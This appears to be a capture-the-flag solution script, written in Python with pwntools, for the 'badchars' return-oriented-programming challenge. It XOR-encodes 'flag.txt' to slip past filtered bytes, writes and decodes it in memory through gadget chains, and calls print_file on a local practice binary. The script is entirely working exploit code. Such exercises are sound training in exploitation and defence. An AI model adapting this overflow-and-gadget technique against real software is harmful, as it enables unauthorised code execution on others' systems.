from pwn import *

def xor_string(string, key):
    xor_tab =[]
    res = ""
    for i, char in enumerate(string):
        nchar = chr(ord(char) ^ key)
        res += nchar
        xor_tab.append(i)
    return bytes(res.encode('utf-8')), xor_tab

context.bits = 64
commande = "flag.txt"
xor_key = 2
resultat, offsets = xor_string(commande, xor_key)

ecriture_r13 = p64(0x400634)
pop_registres = p64(0x40069c)
pop_rdi = p64(0x4006a3)
section_bss = 0x601038
operation_xor = p64(0x400628)
print_file = p64(0x400510)

payload = b'A' * 40 + pop_registres + resultat + p64(section_bss)
payload += p64(0xcafecafecafecafe) + p64(0xcafecafecafecafe) + ecriture_r13

for i in offsets:
    payload += pop_registres
    payload += p64(0xcafecafecafecafe) 
    payload += p64(0xcafecafecafecafe) 
    payload += p64(xor_key)
    payload += p64(section_bss + i)
    payload += operation_xor

payload += pop_rdi
payload += p64(section_bss)
payload += print_file

p = process("./badchars")
p.send(payload)
print(p.recvall().decode('utf-8'))
